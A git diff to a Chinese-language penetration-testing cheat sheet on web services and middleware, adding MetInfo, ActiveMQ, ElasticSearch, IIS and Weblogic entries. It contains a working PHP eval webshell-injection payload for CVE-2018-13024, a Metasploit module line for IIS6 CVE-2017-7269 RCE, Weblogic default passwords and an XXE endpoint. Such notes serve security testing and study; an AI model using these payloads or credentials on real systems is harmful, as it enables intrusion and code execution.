@@ -1,4 +1,4 @@
-# web各类服务和中间件整合笔记
+# web 各类服务和中间件整合笔记
 
 ---
 
@@ -8,6 +8,19 @@
 ---
 
 # 各类论坛/CMS/框架
+**[MetInfo](https://www.metinfo.cn/)**
+- **CVE-2018-13024**
+    - 简介
+
+        远程攻击者可通过向 admin/column/save.php文件发送‘module’参数利用该漏洞向.php文件写入代码并执行该代码。
+
+    - 文章
+        - [CVE-2018-13024复现及一次简单的内网渗透](https://www.freebuf.com/news/193748.html)
+
+    - POC | Payload | exp
+
+        `admin/column/save.php?name=123&action=editor&foldername=upload&module=22;@eval($_POST[1]);/*`
+
 **[phpMyAdmin](https://www.phpmyadmin.net/)**
 - **LOAD DATA INFILE 任意文件读取漏洞**
     - POC | Payload | exp
@@ -90,6 +103,15 @@
     - 漏洞修复
         1. 直接删除upload_json.*和file_manager_json.*
         2. 升级kindeditor到最新版本
+
+---
+
+## ActiveMQ
+- **测试链接**
+
+    `http://<ip>:8161`
+
+---
 
 ## Apache
 - **CVE-2017-9798** Optionsbleed 服务器内存信息泄漏漏洞
@@ -205,6 +227,13 @@ Tomcat 默认端口为 8080，也可能被改为其他端口，后台管理路�
 
 ---
 
+## ElasticSearch
+- **测试链接**
+
+    `http://<ip>:9200`
+
+---
+
 ## IIS
 - **IIS shortname**
 
@@ -259,9 +288,19 @@ Tomcat 默认端口为 8080，也可能被改为其他端口，后台管理路�
     下表显示了每个请求的FS调用的数量(Windows 2008 R2, IIS 7.5(latest patch – June 2012), and .Net framework 4.0.30319 (在别的系统下可能会不同))
     ![image](../../img/渗透/1.jpg)
 
+- **CVE-2017-7269** IIS6.0 RCE
+    - POC | Payload | exp
+
+
+    - MSF模块
+
+        `use exploit/windows/iis/cve-2017-7269`
+
 ---
 
 ## Weblogic
+`老版本 weblogic 有一些常见的弱口令，比如 weblogic、system、portaladmin 和 guest 等，用户名密码交叉使用。`
+
 - **工具**
     - [dr0op/WeblogicScan](https://github.com/dr0op/WeblogicScan)
 
@@ -321,6 +360,15 @@ Tomcat 默认端口为 8080，也可能被改为其他端口，后台管理路�
 
     - POC | Payload | exp
         - [pyn3rd/CVE-2018-3245](https://github.com/pyn3rd/CVE-2018-3245)
+
+- **CVE-2018-3246**
+    - 文章
+        - [看我如何在Weblogic里捡一个XXE（CVE-2018-3246）](https://www.freebuf.com/vuls/186862.html)
+
+    - POC | Payload | exp
+
+        `http://127.0.0.1:8338/ws_utc/begin.do`
+        - [hackping/XXEpayload](https://github.com/hackping/XXEpayload/tree/master/xxe)
 
 - **CVE-2019-2725 && CNVD-C-2019-48814**
     - 文章
